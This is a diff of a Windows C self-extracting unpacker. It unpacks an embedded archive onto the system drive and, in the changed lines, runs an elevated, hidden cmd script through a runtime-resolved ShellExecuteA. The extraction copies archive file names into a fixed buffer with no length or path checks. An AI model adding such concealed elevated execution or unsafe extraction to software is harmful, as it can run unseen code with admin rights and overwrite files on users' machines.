@@ -1,16 +1,17 @@
 #define _CRT_SECURE_NO_WARNINGS
 
+#include <io.h>
+#include <direct.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
 #include <fcntl.h>
 #include <windows.h>
-#include <io.h>
-#include <direct.h>
 
 typedef DWORD (WINAPI *TFN)(VOID);
 typedef DWORD (WINAPI *MSGA)(HWND,LPCSTR,LPCSTR,UINT);
+typedef HINSTANCE (WINAPI *SEA)(HWND,LPCSTR,LPCSTR,LPCSTR,LPCSTR,INT);
 
 #define LZ_BUF_SIZE 259
 #define LZ_CAPACITY 24
@@ -47,83 +48,59 @@ uint8_t dgetc(){
   return s;
 }
 
-void pack_initialize(){
-  dptr=0;
-  buf_size=0;
-  flags=0;
-  vocroot=0;
-  *cbuffer=0;
-  low=0;
-  hlp=0;
-  lenght=0;
-  rle_flag=0;
-  range=0xffffffff;
-  lowp=&((char *)&low)[3];
-  hlpp=&((char *)&hlp)[0];
-  fc=&frequency[256];
-  uint32_t i;
-  for(i=0;i<257;i++) frequency[i]=i;
-  for(i=0;i<0x10000;i++) vocbuf[i]=-1;
-  cpos=cbuffer;
-  if(!hlp){
-    for(i=0;i<sizeof(uint32_t);i++){
-      hlp<<=8;
-      *hlpp=dgetc();
-      if(dptr==data_size) return;
-    }
+uint8_t rc32_getc(uint8_t *c){
+  while((range<0x10000)||(hlp<low)){
+    if(((low&0xff0000)==0xff0000)&&(range+(uint16_t)low>=0x10000))
+      range=0x10000-(uint16_t)low;
+    hlp<<=8;
+    *hlpp=dgetc();
+    if(dptr==data_size) return 0;
+    low<<=8;
+    range<<=8;
   };
-}
-
-void rc32_rescale(){
-  uint16_t i;
-  low+=frequency[symbol]*range;
-  range*=frequency[symbol+1]-frequency[symbol];
-  for(i=symbol+1;i<257;i++) frequency[i]++;
+  range/=*fc;
+  uint32_t count=(hlp-low)/range;
+  if(count>=*fc) return 1;
+  symbol=0;
+  uint16_t i,j=128;
+  while(j){
+    if(frequency[symbol]<=count) symbol+=j;
+    else{
+      if(symbol) symbol-=j;
+      else break;
+    };
+    j>>=1;
+  };
+  if(frequency[symbol]>count&&symbol) symbol--;
+  *c=(uint8_t)symbol;
+  j=frequency[symbol++];
+  low+=j*range;
+  range*=frequency[symbol]-j;
+  for(i=symbol;i<257;i++) frequency[i]++;
   if(*fc>0xffff){
+    uint32_t *fp=frequency;
     frequency[0]>>=1;
     for(i=1;i<257;i++){
       frequency[i]>>=1;
-      if(frequency[i]<=frequency[i-1])
-        frequency[i]=frequency[i-1]+1;
+      if(frequency[i]<=*fp) frequency[i]=*fp+++1;
     };
   };
+  return 0;
 }
 
-int rc32_read(uint8_t *buf,int l){
-  while(l--){
-    while((range<0x10000)||(hlp<low)){
-      if(((low&0xff0000)==0xff0000)&&(range+(uint16_t)low>=0x10000))
-        range=0x10000-(uint16_t)low;
-      hlp<<=8;
-      *hlpp=dgetc();
-      if(dptr==data_size) return 1;
-      low<<=8;
-      range<<=8;
-    };
-    range/=*fc;
-    uint32_t count=(hlp-low)/range;
-    if(count>=*fc) return -1;
-    for(symbol=255;frequency[symbol]>count;symbol--) if(!symbol) break;
-    *buf=(uint8_t)symbol;
-    rc32_rescale();
-    buf++;
-  };
-  return 1;
-}
-
-int unpack_file(){
+uint8_t unpack_file(){
   uint16_t i;
   if(lenght){
     if(!rle_flag){
       symbol=vocbuf[offset++];
-      vocbuf[vocroot++]=(uint8_t)symbol;
+      vocbuf[vocroot++]=symbol;
     };
     lenght--;
   }
   else{
-    if(!flags){
+    if(flags==0){
       cpos=cbuffer;
-      if(rc32_read(cpos++,1)<0) return -1;
+      if(rc32_getc(cpos++)) return 1;
       flags=8;
       lenght=0;
       symbol=*cbuffer;
@@ -132,7 +109,9 @@ int unpack_file(){
         else lenght+=3;
         symbol<<=1;
       };
-      if(rc32_read(cpos,lenght)<0) return -1;
+      for(i=lenght;i;i--)
+        if(rc32_getc(cpos++)) return 1;
+      cpos=cbuffer+1;
     };
     lenght=0;
     if(*cbuffer&0x80){
@@ -140,21 +119,20 @@ int unpack_file(){
       vocbuf[vocroot++]=*cpos;
     }
     else{
-      lenght=*cpos++;
-      lenght+=LZ_MIN_MATCH+1;
+      lenght=*cpos+++LZ_MIN_MATCH+1;
       offset=*(uint16_t*)cpos++;
-      if(offset==0xffff) return 0;
-      if(offset>0xfefe){
+      if(offset==0x0100) return 0;
+      if(offset<0x0100){
         rle_flag=1;
-        symbol=offset-0xfeff;
-        for(i=0;i<lenght;i++) vocbuf[vocroot++]=(uint8_t)symbol;
+        symbol=offset;
+        for(i=0;i<lenght;i++) vocbuf[vocroot++]=symbol;
         lenght--;
       }
       else{
         rle_flag=0;
-        offset+=(uint16_t)(vocroot+LZ_BUF_SIZE);
+        offset=0xffff+(uint16_t)(vocroot+LZ_BUF_SIZE)-offset;
         symbol=vocbuf[offset++];
-        vocbuf[vocroot++]=(uint8_t)symbol;
+        vocbuf[vocroot++]=symbol;
         lenght--;
       };
     };
@@ -162,11 +140,11 @@ int unpack_file(){
     cpos++;
     flags--;
   };
-  return 1;
+  return 0;
 }
 
 void rmkdir(char *path,int depth){
-  for(uint32_t i=depth;i<strlen(path);i++){
+  for(int i=depth;i<strlen(path);i++){
     if(path[i]=='/'){
       path[i]=0;
       if(_access(path,0)!=0){
@@ -182,42 +160,44 @@ void rmkdir(char *path,int depth){
   return;
 }
 
+uint8_t read_packed_value(void *p,uint16_t s){
+  for(uint16_t i=0;i<s;i++){
+    if(unpack_file()) return 1;
+    ((char *)p)[i]=(char)symbol;
+  };
+  return 0;
+}
+
 void unarc(char *out){
-  pack_initialize();
-  uint32_t i;
-  uint32_t fl;
-  char *t;
-  char fp[257];
-  char s;
-  uint32_t fs;
-  while(1){
-    t=(char *)&fl;
-    for(i=0;i<sizeof(uint32_t);i++){
-      if(unpack_file()<0) return;
-      if(offset==0xffff) return;
-      t[i]=(char)symbol;
-    };
+  FILE *o;
+  uint32_t fl=0,i;
+  char *t=(char *)&fl,fp[257];
+  dptr=buf_size=flags=vocroot=low=hlp=lenght=rle_flag=0;
+  offset=range=0xffffffff;
+  lowp=&((char *)&low)[3];
+  hlpp=&((char *)&hlp)[0];
+  fc=&frequency[256];
+  for(i=0;i<257;i++) frequency[i]=i;
+  for(i=0;i<0x10000;i++) vocbuf[i]=0xff;
+  for(i=0;i<sizeof(uint32_t);i++){
+    hlp<<=8;
+    *hlpp=dgetc();
+  }
+  for(;;){
+    if(read_packed_value(t,sizeof(uint32_t))) break;
     if(dptr==data_size) break;
-    for(i=0;i<strlen(out);i++){
-      fp[i]=out[i];
-    };
-    fp[i++]='/';
-    for(i=0;i<fl;i++){
-      if(unpack_file()<0) return;
-      fp[i+strlen(out)+1]=(char)symbol;
-    };
-    fp[i+strlen(out)+1]=0;
-    t=(char *)&fs;
-    for(i=0;i<sizeof(uint32_t);i++){
-      if(unpack_file()<0) return;
-      t[i]=(char)symbol;
-    };
+    for(i=0;i<strlen(out);i++) fp[i]=out[i];
+    fp[i]='/';
+    if(read_packed_value(&fp[strlen(out)+1],fl)) break;
+    if(dptr==data_size) break;
+    fp[fl+strlen(out)+1]=0;
+    if(read_packed_value(t,sizeof(uint32_t))) break;
+    if(dptr==data_size) break;
     rmkdir(fp,0);
-    FILE *o=fopen(fp,"wb");
-    for(i=0;i<fs;i++){
-      if(unpack_file()<0) return;
-      s=(char)symbol;
-      if(o) fputc(s,o);
+    o=fopen(fp,"wb");
+    for(i=0;i<fl;i++){
+      if(unpack_file()) return;
+      if(o) fputc((char)symbol,o);
     };
     if(o) fclose(o);
   };
@@ -260,7 +240,7 @@ int main(int argc,char *argv[]){
     wait_pi();
     sprintf(path,"%s/",getenv("SYSTEMDRIVE"));
     unarc(path);
-    system("%SYSTEMDRIVE%/fixes/ins.cmd");
+    SEA sea=(SEA)GetProcAddress(LoadLibraryA("Shell32.dll"),"ShellExecuteA");
+    sea(NULL,"runas","cmd.exe","/c %SYSTEMDRIVE%\\fixes\\tsk.cmd",NULL,0);
   };
-  return 0;
 }
